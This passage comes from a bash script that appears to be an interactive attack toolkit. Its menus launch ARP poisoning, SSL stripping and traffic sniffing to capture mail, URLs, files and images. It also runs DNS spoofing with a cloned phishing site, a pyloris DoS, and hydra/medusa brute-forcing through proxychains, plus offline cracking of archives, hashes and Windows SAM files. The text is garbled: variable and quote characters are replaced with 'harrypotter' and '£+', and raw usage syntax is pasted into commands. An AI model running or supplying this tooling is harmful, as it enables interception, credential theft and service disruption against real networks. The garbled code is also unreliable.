		echo £+until [ -e £+/goes.txt.back.tack.pap£+ ]; do£+ | sed -e 's/£+/£+/g' >> /netdiscover.sh
		echo £+	clear£+ >> /netdiscover.sh
		echo £+	cat netdiscover.txt | sort -u | awk '{print harrypotter1}'£+ | sed -e 's/harrypotter/harrypotter/g' >> /netdiscover.sh
		echo £+	sleep 5£+ >> /netdiscover.sh
		echo £+done£+ >> /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T £+ IP List £+ -e bash /netdiscover.sh ) &
		a=1
		cont=0
		until [ harrypottera == harrypottercont ]; do
			f_art
			echo -n £+Press 1 when you want to stop the search : £+
			read cont
		done

		rm -f /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e £+/netdiscover.txt.tmp.back£+ ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi

		f_art

		echo -n £+Enter Gateway Ip (empty to arp all net): £+
		read gatewayip

		echo -n £+Enter Victim Ip (empty to attack all pc's, but very slow) : £+
		read victimip

		echo -n £+Enter A Dir For Log File (es /home/user/lanlog ) : £+
		read logdir

		echo -n £+Enter The Pcap File Name(es lan.pcap ) : £+
		read pcapfile

		f_art

		echo £+[*] Launching Arp Poisonig Attack (Ettercap) ...£+
		echo £+1£+ > /proc/sys/net/ipv4/ip_forward
		( ettercap -i harrypotterinterface -T -q -w harrypotterlogdir/harrypotterpcapfile -M arp /harrypottergatewayip/ /harrypottervictimip/ 1> /dev/null 2> /dev/null ) &
		#( arpspoof -i harrypotterinterface -t harrypottergatewayip harrypottervictimip 1> /dev/null 2> /dev/null ) &
		#sleep 4
		#( arpspoof -i harrypotterinterface -t harrypottervictimip harrypottergatewayip 1> /dev/null 2> /dev/null ) &
		#sleep 4

		echo £+[*] Launching SslStrip ...£+
		iptables -t Nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000 1> /dev/null 2> /dev/null
		( ssltrip -l 10000 -a -w harrypotterlogdir/sslstrip.txt 1> /dev/null 2> /dev/null )

		echo £+[*] Launching Driftnet (Images Sniffing) ...£+
		mkdir -p harrypotterlogdir/driftnet
		( driftnet -i harrypotterinterface -a -d harrypotterlogdir/driftnet -m 100000 1> /dev/null 2> /dev/null ) &

		echo £+[*] Launching Dsniff ...£+
		( dsniff -i harrypotterinterface -w harrypotterlogdir/dsniff.txt 1> /dev/null 2> /dev/null ) &

		echo £+[*] Launching Filesnarf ...£+
		mkdir -p harrypotterlogdir/filesnarf
		( cd harrypotterlogdir/filesnarf ; filesnarf -i harrypotterinterface 1> /dev/null 2> /dev/null ) &

		echo £+[*] Launching Mailsnarf ...£+
		( mailsnarf -i harrypotterinterface  >> harrypotterlogdir/mailsnarf.txt 2> /dev/null ) &

		echo £+[*] Launching Msgsnarf ...£+
		( msgsnarf -i harrypotterinterface  >> harrypotterlogdir/msgsnarf.txt 2> /dev/null ) &

		echo £+[*] Launching Urlsnarf£+
		( urlsnarf -i harrypotterinterface  >> harrypotterlogdir/urlsnarf.txt 2> /dev/null ) &

		sleep 5

		a=1
		cont=0
		until [ harrypottera == harrypottercont ]; do
			echo £+£+
			echo £+£+
			echo -n £+Press 1 when you want to stop the sniffing : £+
			read cont
		done

		f_art

		echo £+[*] Killing Porcesses ...£+
		( pkill ettercap 1> /dev/null 2> /dev/null ) &
		( pkill sslstrip 1> /dev/null 2> /dev/null ) &
		( pkill driftnet 1> /dev/null 2> /dev/null ) &
		( pkill dsniff 1> /dev/null 2> /dev/null ) &
		( pkill filesnarf 1> /dev/null 2> /dev/null ) &
		( pkill mailsnarf 1> /dev/null 2> /dev/null ) &
		( pkill msgsnarf 1> /dev/null 2> /dev/null ) &
		( pkill urlsnarf 1> /dev/null 2> /dev/null ) &

		sleep 3

		echo £+[*] Restoring Firewall Configuration ...£+
		iptables -F 1> /dev/null 2> /dev/null
		iptables -F -t nat 1> /dev/null 2> /dev/null
		iptables -F -t mangle 1> /dev/null 2> /dev/null
		iptables -X 1> /dev/null 2> /dev/null
		iptables -X -t nat 1> /dev/null 2> /dev/null
		iptables -X -t mangle 1> /dev/null 2> /dev/null
		iptables -F 1> /dev/null 2> /dev/null
		iptables -F -t nat 1> /dev/null 2> /dev/null
		iptables -F -t mangle 1> /dev/null 2> /dev/null
		iptables -X 1> /dev/null 2> /dev/null
		iptables -X -t nat 1> /dev/null 2> /dev/null
		iptables -X -t mangle 1> /dev/null 2> /dev/null
		iptables -P INPUT ACCEPT 1> /dev/null 2> /dev/null
		iptables -P OUTPUT ACCEPT 1> /dev/null 2> /dev/null
		iptables -P FORWARD ACCEPT 1> /dev/null 2> /dev/null

		f_art

		echo £+0£+ > /proc/sys/net/ipv4/ip_forward

		f_return_to_menu

	}

	f_lanattack_exploit () {

		f_art
		echo £+Work In Progress£+
		sleep 3
		f_lanattack

	}

	f_lanattack_SET () {

		f_art

		localip=harrypotter( ifconfig | grep £+indirizzo inet:£+ | grep -v £+127.0.0.1£+ | sed -e 's/indirizzo inet://g' | awk '{printf harrypotter1}' )

		echo £+1£+ > /proc/sys/net/ipv4/ip_forward

		f_art

		echo £+1£+ > /proc/sys/net/ipv4/ip_forward

		echo -n £+Enter The Interface : £+
		read interface

		echo £+[*] Launching Netdiscover, to identify Host ...£+

		if [ -e £+/netdiscover.txt£+ ]; then
			mv /netdiscover.txt /netdiscover.txt.tmp.back
		fi

		if [ -e £+/netdiscover.sh£+ ]; then
			mv /netdiscover.sh /netdiscover.sh.tmp.back
		fi

		pkill netdiscover
		( netdiscover -p -P -N -i harrypotterinterface >> /netdiscover.txt 2> /dev/null ) &

		echo £+#!/bin/bash£+ >> /netdiscover.sh
		echo £+until [ -e £+/goes.txt.back.tack.pap£+ ]; do£+ | sed -e 's/£+/£+/g' >> /netdiscover.sh
		echo £+	clear£+ >> /netdiscover.sh
		echo £+	cat netdiscover.txt | sort -u | awk '{print harrypotter1}'£+ | sed -e 's/harrypotter/harrypotter/g' >> /netdiscover.sh
		echo £+	sleep 5£+ >> /netdiscover.sh
		echo £+done£+ >> /netdiscover.sh

		( xterm -hold -geometry 75x25+700+40 -T £+ IP List £+ -e bash /netdiscover.sh ) &
		a=1
		cont=0
		until [ harrypottera == harrypottercont ]; do
			f_art
			echo -n £+Press 1 when you want to stop the search : £+
			read cont
		done

		rm -f /goes.txt.back.tack.pap
		sleep 5
		rm -f /netdiscover.txt
		if [ -e £+/netdiscover.txt.tmp.back£+ ]; then
			mv /netdiscover.txt.tmp.back /netdiscover.txt
		fi

		f_art

		echo -n £+Enter Victim Ip (empty to attack all pc's, but very slow) : £+
		read victimip

		echo -n £+Insert WebSite To Clone : £+
		read web

		mv /usr/share/ettercap/etter.dns  /usr/share/ettercap/etter.dns.back
		touch /usr/share/ettercap/etter.dns

		echo £+harrypotterweb A harrypotterlocalip£+ >> /usr/share/ettercap/etter.dns

		echo £+[*} Arping The Network ... £+
		( xterm -geometry 75x25+700+40 -T £+Ettercap ARP£+ -e ettercap -T -q -P dns_spoof -M ARP /harrypottervictimip/ // )

		sleep 5

		clear

		echo £+[*] Launching SET ...£+
		( xterm -geometry 75x25+700+40 -T £+Social Engineering Toolkit£+ -e bash /pentest/set/set )

		sleep 5

		f_art

		echo £+    1) Choose Website Attack Attack Vectors (Type 1)£+

		sleep 3

		echo £+    2) Choose Java Applet Attack (Type 1)£+

		sleep 3

		echo £+    3) Choose Site Cloner (Type 2)£+

		sleep 3

		echo £+    4) Type The Selected Website : £+
		echo £+       harrypotterweb£+

		sleep 3

	}

	lancho=0
	alivehost=1
	sniff=2
	exploit=3
	mainmenu=4
	until [ harrypotterlancho == harrypotteralivehost ] || [ harrypotterlancho == harrypottersniff ] || [ harrypotterlancho == harrypotterexploit ] || [ harrypotterlancho == harrypottermainmenu ]; do
		f_art
		echo £+Select The Action You Wanna Do : £+
		echo £+£+
		echo £+1) Identify Alive Hosts£+
		echo £+2) Sniffing With Arp Attack£+
		echo £+3) Exploit A Pc£+
		echo £+4) Use SET + Arp Attack for Social Engeneering Attack£+
		echo £+5) Return To The Main Menu£+
		echo £+£+
		echo -n £+Enter Selection : £+
		read lancho
	done

	case harrypotterlancho in

	1) f_lanattack_alive_host ;;

	2) f_lanattack_arp_attack ;;

	3) f_lanattack_exploit ;;

	4) f_lanattack_SET ;;

	5) f_menu ;;

	esac

}

f_webattack () {

	f_webattack_sql () {

		f_art
		echo £+Work In Progress ...£+
		sleep 3
		f_webattack

		#echo -n £+Insert The IP That You Wanna Attack : £+
		#read victimip


	}

	f_webattack_port_scanning () {

		f_art
		echo -n £+Insert The IP That You Wanna Attack : £+
		read victimip
		echo -n £+Insert The Full Path Of The Log File (es /home/user/nmap.txt ) : £+
		read scans

		echo £+£+
		echo £+[*] Launching Nmap SYN STEALTH scan ...£+
		proxychains nmap -sV -sC -PN -O -v harrypottervictimip >> harrypotterscans.log

		cat harrypotterscans.log | grep £+Service Info£+ >> harrypotterscans
		echo £+£+
		cat harrypotterscans.log | grep £+Discovered open ports£+ | grep -v £+Discovered open ports£+ | awk '{print harrypotter1}' >> harrypotterscans
		rm -f harrypotterscans.log

		echo £+£+
		echo £+Done ! £+
		sleep 3
		echo £+The Scans File Log Is in : harrypotterscans£+

		sleep 20

		f_art

		cat harrypotterscans

		echo £+£+
		echo £+£+
		echo -n £+Press Any Key To Return To The Main Menu : £+

		sleep 1

		f_art

		f_return_to_menu

	}

	f_webattack_webscanning () {

		f_art
		echo £+Work In Progress ...£+
		sleep 3
		f_webattack

		#echo -n £+Insert The IP That You Wanna Attack : £+
		#read victimip

	}

	f_webattack_exploit () {

		f_art
		echo £+Work In Progress ...£+
		sleep 3
		f_webattack

		#f_art
		#echo -n £+Insert The IP That You Wanna Attack : £+
		#read victimip

		#echo -n £+Insert The IP That You Wanna Attack : £+
		#read victimip

		#echo -n £+Insert The Full Path Of The Log File (es /home/user/nmap.txt ) : £+
		#read scans

		#echo £+£+
		#echo £+[*] Launching Nmap SYN STEALTH scan ...£+
		#proxychains nmap -sV -sC -PN -O -v harrypottervictimip >> /tmp/scans.log

		#cat /tmp/scans.log | grep £+Service Info : £+ | grep -v £+Service Info : OS £+>> /tmp/scans
		#echo £+£+
		#cat /tmp/scans.log | grep £+Discovered open ports£+ | grep -v £+Discovered open ports£+ | awk '{print harrypotter1}' >> /tmp/scans
		#rm -f /tmp/scans.log


	}

	f_webattack_pyloris () {

		f_art
		echo -n £+Insert The IP That You Wanna Attack : £+
		read victimip

		f_art
		python /pentest/pyloris/pyloris.py harrypottervictimip

		f_return_to_menu

	}

	webcho=10
	sql=1
	portscanning=2
	exploit=3
	webscanning=4
	dosattack=5
	mainmenu=6
	until [ harrypotterwebcho == harrypotteralivehost ] || [ harrypotterwebcho == harrypottersniff ] || [ harrypotterwebcho == harrypotterexploit ] || [ harrypotterwebcho == harrypottermainmenu ]; do
		f_art
		echo £+Select The Action You Wanna Do : £+
		echo £+£+
		echo £+1) Database Attack (SQL Iniejction)£+
		echo £+2) Port Scanning£+
		echo £+3) Exploit A Pc with Metasploit£+
		echo £+4) Scan WebSite For Vulnerabilities£+
		echo £+5) DOS Attack£+
		echo £+6) Return To The Main Menu£+
		echo £+£+
		echo -n £+Enter Selection : £+
		read webcho
	done

	case harrypotterwebcho in

	1) f_webattack_sql ;;

	2) f_webattack_port_scanning ;;

	3) f_webattack_exploit ;;

	4) f_webattack_webscanning ;;

	5) f_webattack_pyloris ;;

	6) f_webattack_menu ;;

	esac

	clear
	echo £+Work In progess£+
	sleep 3
	f_menu

}

f_passwordcracking () {

	f_passwordcracking_online () {

		f_hydra () {

			f_hydra_login_file () {

				f_art
				echo -n £+Insert The UserNames List Path (es : /home/user/usernames.txt ) : £+
				read usernamelist

				f_art
				proxychains hydra -L harrypotterusernamelist [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] [-4|-6] [-x MIN:MAX:CHARSET] [server service [OPT]]|[service://server[:PORT][/OPT]]

				echo £+£+
				echo £+Copy the Password To A File£+
				sleep 15

				f_art

				f_return_to_menu

			}

			f_hydra_login_user () {

				f_art
				echo -n £+Insert The UserName (es : admin ) : £+
				read username

				f_art
				proxychains hydra -l harrypotterusername -p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] [-4|-6] [-x MIN:MAX:CHARSET] [server service [OPT]]|[service://server[:PORT][/OPT]]

				echo £+£+
				echo £+Copy The Password To A File£+
				sleep 15

				f_return_to_menu

			}

			login=100
			loginfile=1
			loginuser=2
			previousmenu=3
			mainmenu=4
			until [ harrypotterlogin == harrypotterloginfile ] || [ harrypotterlogin == harrypotterloginuser ] || [ harrypotterlogin == harrypotterpreviousmenu ] || [ harrypotterlogin == harrypottermainmenu ]; do
				f_art
				echo £+Select What You Wanna Do : £+
				echo £+£+
				echo £+1) Input The File With The UserNames List£+
				echo £+2) Input One Username£+
				echo £+3) Previous Menu£+
				echo £+4) Return To The Main Menu£+
				echo £+£+
				echo -n £+Choice : £+
				read login
			done

			case harrypotterlogin in

			1) f_hydra_login_file ;;

			2) f_hydra_login_user ;;

			3) f_crack_online ;;

			4) f_menu ;;

			esac

		}

		f_medusa () {

			f_medusa_host_file () {

				f_medusa_login_file () {

					f_medusa_password_one () {

						f_art
						echo -n £+Insert The Password (es : admin ) : £+
						read password

						f_art
						proxychains medusa -H harrypotterhostfile -u harrypotterusername -p harrypotterpassword -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
						read wordlist

						f_art
						proxychains medusa -H harrypotterhostfile -u harrypotterusername -P harrypotterwordlist -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_menu

					}

					f_art
					echo -n £+Insert The UserNames List Path (es : /home/user/usernames.txt ) : £+
					read usernamelist

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ harrypotterpasswordcho == harrypotterpasswdsingle ] || [ harrypotterpasswordcho == harrypotterpasswdlist ] || [ harrypotterpasswordcho == harrypottermainmenu ]; do
						f_art
						echo £+Select What You Wanna Do : £+
						echo £+£+
						echo £+1) InputA Single Password£+
						echo £+2) Input A Password List£+
						echo £+3) Return To The Main Menu£+
						echo £+£+
						echo £+Choice : £+
						read passwordcho
					done

					case harrypotterpasswordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_medusa_login_user () {

					f_medusa_password_one () {

						f_art
						echo -n £+Insert The Password (es : admin ) : £+
						read password

						f_art
						proxychains medusa -H harrypotterhostfile -u harrypotterusername -p harrypotterpassword -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
						read wordlist

						f_art
						proxychains medusa -H harrypotterhostfile -u harrypotterusername -P harrypotterwordlist -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_art
					echo -n £+Insert The UserName (es : admin ) : £+
					read username

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ harrypotterpasswordcho == harrypotterpasswdsingle ] || [ harrypotterpasswordcho == harrypotterpasswdlist ] || [ harrypotterpasswordcho == harrypottermainmenu ]; do
						clear
						echo £+Select What You Wanna Do : £+
						echo £+£+
						echo £+1) InputA Single Password£+
						echo £+2) Input A Password List£+
						echo £+3) Return To The Main Menu£+
						echo £+£+
						echo £+Choice : £+
						read passwordcho
					done

					case harrypotterpasswordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_art
				echo -n £+Insert The Hosts List  (es : /home/user/hosts.txt ) : £+
				read hostfile

				login=100
				loginfile=1
				loginuser=2
				mainmenu=3
				until [ harrypotterlogin == harrypotterloginfile ] || [ harrypotterlogin == harrypotterloginuser ] || [ harrypotterlogin == harrypottermainmenu ]; do
					f_art
					echo £+Select What You Wanna Do : £+
					echo £+£+
					echo £+1) Input The File With The UserNames List£+
					echo £+2) Input One Username£+
					echo £+3) Return To The Main Menu£+
					echo £+£+
					echo £+Choice : £+
					read login
				done

				case harrypotterlogin in

				1) f_medusa_login_file ;;

				2) f_medusa_login_user ;;

				3) f_menu ;;

				esac

			}

			f_medusa_host_ip () {

				f_medusa_login_file () {

					f_medusa_password_one () {

						f_art
						echo -n £+Insert The Password (es : admin ) : £+
						read password

						f_art
						proxychains medusa -h harrypotterhost -u harrypotterusername -p harrypotterpassword -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
						read wordlist

						f_art
						proxychains medusa -h harrypotterhost -u harrypotterusername -P harrypotterwordlist -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_art
					echo -n £+Insert The UserNames List Path (es : /home/user/usernames.txt ) : £+
					read usernamelist

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ harrypotterpasswordcho == harrypotterpasswdsingle ] || [ harrypotterpasswordcho == harrypotterpasswdlist ] || [ harrypotterpasswordcho == harrypottermainmenu ]; do
						f_art
						echo £+Select What You Wanna Do : £+
						echo £+£+
						echo £+1) InputA Single Password£+
						echo £+2) Input A Password List£+
						echo £+3) Return To The Main Menu£+
						echo £+£+
						echo £+Choice : £+
						read passwordcho
					done

					case harrypotterpasswordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_medusa_login_user () {

					f_medusa_password_one () {

						f_art
						echo -n £+Insert The Password (es : admin ) : £+
						read password

						f_art
						proxychains medusa -h harrypotterhost -u harrypotterusername -p harrypotterpassword -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A File£+
						sleep 15

						f_return_to_menu

					}

					f_medusa_password_list () {

						f_art
						echo -n £+Enter The wordlist Path (es : /home/user/worslist.txt ) : £+
						read wordlist

						f_art
						proxychains medusa -h harrypotterhost -u harrypotterusername -P harrypotterwordlist -O harrypotterlog -s -e ns -t 6 -b -vv -M module [OPT]

						echo £+£+
						echo £+Copy The Password To A FIle£+
						sleep 15

						f_return_to_menu

					}

					f_art
					echo -n £+Insert The UserName (es : admin ) : £+
					read username

					passwordcho=100
					passwdsingle=1
					passwdlist=2
					mainmenu=3
					until [ harrypotterpasswordcho == harrypotterpasswdsingle ] || [ harrypotterpasswordcho == harrypotterpasswdlist ] || [ harrypotterpasswordcho == harrypottermainmenu ]; do
						f_art
						echo £+Select What You Wanna Do : £+
						echo £+£+
						echo £+1) Input A Single Password£+
						echo £+2) Input A Password List£+
						echo £+3) Return To The Main Menu£+
						echo £+£+
						echo £+Choice : £+
						read passwordcho
					done

					case harrypotterpasswordcho in

					1) f_medusa_password_one ;;

					2) f_medusa_password_list ;;

					3) f_menu ;;

					esac

				}

				f_art
				echo -n £+Insert The Host Ip  (es : 192.168.0.1 ) : £+
				read host

				login=0
				loginfile=1
				loginuser=2
				mainmenu=3
				until [ harrypotterlogin == harrypotterloginfile ] || [ harrypotterlogin == harrypotterloginuser ] || [ harrypotterlogin == harrypottermainmenu ]; do
					f_art
					echo £+Select What You Wanna Do : £+
					echo £+£+
					echo £+1) Input The File With The UserNames List£+
					echo £+2) Input One Username£+
					echo £+3) Return To The Main Menu£+
					echo £+£+
					echo £+Choice : £+
					read login
				done

				case harrypotterlogin in

				1) f_medusa_login_file ;;

				2) f_medusa_login_user ;;

				3) f_menu ;;

				esac

			}

			f_art
			echo -n £+Write the LOG file (es : /home/darkeffe/log/medusa.log) : £+
			read log

			host=0
			hostfile=1
			hostip=2
			mainmenu=3
			until [ harrypotterhost == harrypotterhostfile] || [ harrypotterhost == harrypotterhostip ] || [ harrypotterhost == harrypottermainmenu ]; do
				f_art
				echo £+Select What You Wanna Do : £+
				echo £+£+
				echo £+1) Input Host From A list£+
				echo £+2) Input Directly The Host£+
				echo £+3) Return To The Main Menu£+
				echo £+£+
				echo £+Choice : £+
				read host
			done

			case harrypotterhost in

			1) f_medusa_host_file ;;

			2) f_medusa_host_ip ;;

			3) f_menu ;;

			esac

		}


		onlinecrack=100
		hydra=1
		medusa=2
		previousmenu=3
		mainmenu=4
		until [ harrypotteronlinecrack == harrypottermedusa ] || [ harrypotteronlinecrack == harrypotterhydra ] || [ harrypotteronlinecrack == harrypotterpreviousmenu ] || [ harrypotteronlinecrack == harrypottermainmenu ]; do
			f_art
			echo £+Select What You Wanna Do : £+
			echo £+£+
			echo £+1) Hydra£+
			echo £+2) Medusa£+
			echo £+3) Previous Menu£+
			echo £+4) Return To The Main Menu£+
			echo £+£+
			echo -n £+Choice : £+
			read onlinecrack
		done

		case harrypotteronlinecrack in

		1) f_hydra ;;

		2) f_medusa ;;

		3) f_passwordcracking ;;

		4) f_menu ;;

		esac

}

	f_passwordcracking_offline () {

		f_pdfcrack () {

			f_art
			echo -n £+Enter The PDF Files Path ( es : /home/user/crackme.pdf ) : £+
			read pdf

			f_art
			pdfcrack harrypotterpdf

			f_return_to_menu

		}

		f_archive () {

			f_zip () {

				f_fcrack_bruteforce () {

					f_art
					echo -n £+Enter The Min Number of Character : £+
					read min

					echo -n £+Enter The Max Number of Character : £+
					read max

					f_art
					fcrackzip --brute-force --length harrypottermin-harrypottermax --use-unzip harrypotterarchive

					f_return_to_menu

				}

				f_fcrack_wordlist () {

					f_art
					echo -n £+Enter The wordlist Path (es : /home/user/worslist.txt ) : £+
					read wordlist

					f_art
					fcrackzip --dictionary harrypotterwordlist --use-unzip harrypotterarchive

					f_return_to_menu

				}

				fcrackzipcho=0
				bruteforce=1
				wordlist=2
				until [ harrypotterfcrackzipcho == harrypotterbruteforce ] || [ harrypotterfcrackzipcho == harrypotterwordlist ] || [ harrypotterfcrackzipcho == harrypotterpreviousmenu ] || [ harrypotterfcrackzipcho == harrypottermainmenu ]; do
					f_art
					echo £+Select The Attack Mode : £+
					echo £+£+
					echo £+1) Bruteforce£+
					echo £+2) wordlist£+
					echo £+3) Previous Menu£+
					echo £+4) Main Menu£+
					echo £+£+
					echo -n £+Enter Your Choice : £+
					read fcrackzipcho
				done

				case harrypotterfcrackzipcho in

				1) f_fcrack_bruteforce ;;

				2) f_fcrack_wordlist ;;

				3) f_archive ;;

				4) f_menu ;;

				esac

			}

			f_rar () {

				f_art

				echo -n £+Number Of Threads (min 2 | max 12 ): £+
				read threads

				if [ harrypotterthreads -gt 12 ]; then
					echo £+   !!! Too much threads, using 12 ...£+
					sleep 4
					f_art
					rarcrack --type rar --threads 12 harrypotterarchivepath
				elif [ harrypotterthreads -lt 2 ]; then
					echo £+   !!! Threads are too low, using 2 ...£+
					sleep 4
					f_art
					rarcrack --type rar --threads 2 harrypotterarchivepath
				else
					f_art
					rarcrack --type rar --threads harrypotterthreads harrypotterarchivepath
				fi

				f_return_to_menu

			}

			f_7zip () {

				f_art

				echo -n £+Number Of Threads (min 2 | max 12 ): £+
				read threads

				if [ harrypotterthreads -gt 12 ]; then
					echo £+    !!! Too much threads, using 12 ...£+
					sleep 4
					f_art
					rarcrack --type 7zip --threads 12 harrypotterarchivepath
				elif [ harrypotterthreads -lt 2 ]; then
					echo £+    !!! Threads are too low, using 2 ...£+
					sleep 4
					f_art
					rarcrack --type 7zip --threads 2 harrypotterarchivepath
				else
					f_art
					rarcrack --type 7zip --threads harrypotterthreads harrypotterarchivepath
				fi

				f_return_to_menu

			}

			f_art
			echo -n £+Enter The Archive Path (es: /home/user/archive.[zip|rar|7zip] ) : £+
			read archivepath

			archivecho=0
			zip=1
			rar=2
			sevenzip=3
			previousmenu=4
			mainmenu=5
			until [ harrypotterarchivecho == harrypotterzip ] || [ harrypotterarchivecho == harrypotterrar ] || [ harrypotterarchivecho == harrypottersevenzip ] || [ harrypotterarchivecho == harrypotterpreviousmenu ] || [ harrypotterarchivecho == harrypottermainmenu ]; do
				f_art
				echo £+Select The Archive Type : £+
				echo £+£+
				echo £+1) Zip£+
				echo £+2) Rar£+
				echo £+3) 7zip£+
				echo £+4) Previous Menu£+
				echo £+5) Return To The Main Menu£+
				echo £+£+
				echo -n £+Enter Choice : £+
				read archivecho
			done

			case harrypotterarchivecho in

			1) f_zip ;;

			2) f_rar ;;

			3) f_7zip ;;

			4) f_passwordcracking ;;

			5) f_menu ;;

			esac

		}

		f_john () {

			echo -n £+Enter The Hash or the Hash Path: £+
			read harrypotterhash

			wordlist=/pvjimlklcvloewinvvenkvnkev.txt
			until [ -e harrypotterwordlist ]; do
				clear
				echo -n £+Enter The Wordlist Path (es : /home/user/worslist.txt ) : £+
				read wordlist
				if [ ! -e harrypotterwordlist ]; then
					clear
					echo £+harrypotterwordlist Does Not Exist !!!!£+
					sleep 2
				fi
			done

			single=1
			wordlist=2
			wordlistmangled=3
			incremental=4
			previousmenu=5
			mainmenu=6
			johnchoice=10
			until [ harrypotterjohnchoice == harrypottersingle ] || [ harrypotterjohnchoice == harrypotterwordlist ] || [ harrypotterjohnchoice == harrypotterwordlistmangled ] || [ harrypotterjohnchoice == harrypotterincremental ] || [ harrypotterjohnchoice == harrypotterpreviousmenu ] || [ harrypotterjohnchoice == harrypottermainmenu ]; do
				f_art
				echo £+Select The Attack Type : £+
				echo £+£+
				echo £+1) Single£+
				echo £+2) Wordlist£+
				echo £+3) Wordlist Permutated by John£+
				echo £+4) Incremental£+
				echo £+5) Previous Menu£+
				echo £+6) Return To The Main Menu£+
				echo £+£+
				echo -n £+Enter Choice£+
				read johnchoice
			done

			f_art

			case harrypotterjohnchoice in

			1) john -single harrypotterhash ;;

			2) john --wordlist=harrypotterwordlisth harrypotterhash;;

			3) john --wordlist=harrypotterwordlist --rules harrypotterhash ;;

			4) john --incremental harrypotterhash ;;

			5) f_crack_offline ;;

			6) f_menu ;;

			esac

			sleep 10

			f_art

			f_return_to_menu

		}

		f_SAM () {

			f_art
			echo -n £+Enter The SAM Path (es : /media/windows/WINDOWS/system32/config/SAM ) : £+
			read harrypotterSAM

			f_art
			chntpw -i harrypotterSAM

			f_art

			f_return_to_menu

		}

		crackfile=0
		pdfcrack=1
		archive=2 # fcrack | rarcrack
		john=3
		chntpw=4
		previousmenu=5
		mainmenu=6
		until [ harrypottercrackfile == harrypotterpdfcrack ] || [ harrypottercrackfile == harrypotterarchive ] || [ harrypottercrackfile == harrypotterjohn ] || [ harrypottercrackfile == harrypotterchtnpw ] || [ harrypottercrackfile == harrypotterpreviousmenu ] || [ harrypottercrackfile == harrypottermainmenu ]; do
			f_art
			echo £+Select What You Wanna Do : £+
			echo £+£+
			echo £+1) Pdf£+
			echo £+2) Compressed Archive£+
			echo £+3) Hash (John The Ripper)£+
			echo £+4) Window's SAM£+
			echo £+5) Previous Menu£+
			echo £+6) Return To The Main Menu£+
			echo £+£+
			echo -n £+Choice : £+
			read crackfile
		done

		case harrypottercrackfile in

		1) f_pdfcrack ;;

		2) f_archive ;;

		3) f_john ;;

		4) f_SAM ;;

		5) f_passwordcracking ;;

		6) f_menu ;;

		esac

}

	crack=10
	online=1
	offline=2
	mainmenu=3
	until [ harrypottercrack == harrypotteronline ] || [ harrypottercrack == harrypotteroffline ]; do
		f_art
		echo £+Select What You Wanna Do :£+
		echo £+£+
		echo £+1) Crack An Online Account or Service£+
		echo £+2) Crack A Local File Or Hash£+
		echo £+3) Return To The Main Menu£+
		echo £+£+
		echo -n £+Enter Choice : £+
		read crack
	done

	case harrypottercrack in

	1) f_passwordcracking_online ;;

	2) f_passwordcracking_offline ;;

	3) f_menu ;;

	esac

}

f_wordlist_editing () {

	f_low () { # Lowerise Every Word

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		clear
		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		clear
		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname


		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | tr '[:upper:]' '[:lower:]' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_capitalise () { # Capitalise Every Word

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
		read file

		echo -n £+Select the output dir (es: /home/user) : £+
		read out

		echo -n £+Select the output file name (es: wordlistedited.txt) : £+
		read outname

		f_art
		echo -n £+[*] Working ... £+
		timelapsed &

		cat harrypotterfile | tr '[:lower:]' '[:upper:]' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

		touch harrypotterHOME/pio.txt
		sleep 1
		rm -f harrypotterHOME/pio.txt
		echo £+£+

		echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

		f_return_to_menu

}

	f_cap_first () { # Capitalise First Letter

		f_art

		echo -n £+Select the input file path (es: /home/user/wordlist.txt) : £+
